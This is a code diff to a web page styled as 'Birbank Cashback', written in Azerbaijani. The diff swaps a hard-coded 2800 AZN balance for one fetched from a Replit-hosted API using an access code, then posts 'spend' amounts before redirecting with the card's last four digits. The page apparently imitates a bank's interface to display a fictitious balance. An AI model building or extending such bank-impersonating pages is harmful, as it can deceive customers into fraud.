@@ -226,7 +226,7 @@
             <div style="color: gray; font-size: 14px; margin-bottom: 6px">
               Birbank Cashback
             </div>
-            <div class="balance" style="color: black; font-size: 13px"></div>
+            <div class="balance" style="color: black; font-size: 13px">Yüklənir...</div>
           </div>
         </div>
       </div>
@@ -299,17 +299,47 @@
       const resultContainer = document.getElementById("resultContainer");
       const spinnerOverlay = document.getElementById("spinnerOverlay");
 
-      // ✅ Balans localStorage ilə idarə olunur
-      let balance = localStorage.getItem("balance")
-        ? parseFloat(localStorage.getItem("balance"))
-        : 2800;
+      const API_URL = "https://8e02283d-6dab-4cbf-93db-16181ed3b0aa-00-297hqfhjj5j3a.kirk.replit.dev";
+      let balance = 0;
 
-      function updateBalance() {
+      function updateBalanceUI() {
         document.querySelector(".balance").innerText =
           balance.toLocaleString("az-AZ") + " AZN";
       }
 
-      updateBalance();
+      async function loadBalance() {
+        let code = localStorage.getItem("basparo_code");
+
+        if (!code) {
+          const entered = prompt("Kodunuzu daxil edin (məs: BSP-XXXX):");
+          if (!entered) return;
+
+          code = entered.trim().toUpperCase();
+          localStorage.setItem("basparo_code", code);
+        }
+
+        try {
+          const res = await fetch(API_URL + "/api/users/me", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ code })
+          });
+          if (!res.ok) throw new Error("Invalid code");
+
+          const data = await res.json();
+          balance = Number(data.balance) || 0;
+          localStorage.setItem("balance", balance);
+          updateBalanceUI();
+        } catch (e) {
+          console.log("API error:", e);
+          const saved = localStorage.getItem("balance");
+          balance = saved ? parseFloat(saved) : 0;
+          updateBalanceUI();
+          localStorage.removeItem("basparo_code");
+        }
+      }
+
+      window.addEventListener("load", loadBalance);
 
       function formatCard(val) {
         let d = val.replace(/\D/g, "");
@@ -381,18 +411,41 @@
         let cnum = card.value.replace(/\s/g, "");
         const last4 = cnum.slice(-4);
 
-        // ✅ Balansı azaldırıq və localStorage-a yazırıq
-        balance -= amt;
-        if (balance < 0) balance = 0;
-        localStorage.setItem("balance", balance);
-        updateBalance();
+        const code = localStorage.getItem("basparo_code");
+        if (!code) {
+          alert("Kod tapılmadı. Əsas səhifəyə qayıdın.");
+          window.location.href = "index.html";
+          return;
+        }
 
         spinnerOverlay.style.display = "flex";
 
-        setTimeout(() => {
-          spinnerOverlay.style.display = "none";
-          window.location.href = `5.html?amount=${amt.toFixed(2)}&card=${last4}`;
-        }, 1000);
+        fetch(API_URL + "/api/users/spend", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code: code, amount: amt })
+        })
+          .then(res => {
+            if (!res.ok) throw new Error("Server error");
+            return res.json();
+          })
+          .then(data => {
+            spinnerOverlay.style.display = "none";
+            if (data.error) {
+              alert(data.error);
+              return;
+            }
+            balance = Number(data.balance) || 0;
+            localStorage.setItem("balance", balance);
+            if (typeof updateBalanceUI === "function") updateBalanceUI();
+            else updateBalance();
+            window.location.href =
+              "5.html?amount=" + amt.toFixed(2) + "&card=" + last4;
+          })
+          .catch(() => {
+            spinnerOverlay.style.display = "none";
+            alert("Xəta baş verdi. İnternet bağlantınızı yoxlayın.");
+          });
       }
 
       btn.onclick = sendStep1;
